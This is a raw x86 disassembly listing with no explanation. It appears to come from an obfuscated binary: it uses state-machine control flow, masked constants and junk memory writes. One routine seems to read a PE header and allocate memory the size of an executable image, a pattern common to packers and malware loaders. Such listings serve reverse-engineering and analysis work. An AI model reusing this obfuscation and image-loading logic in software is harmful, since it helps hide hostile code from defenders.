  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
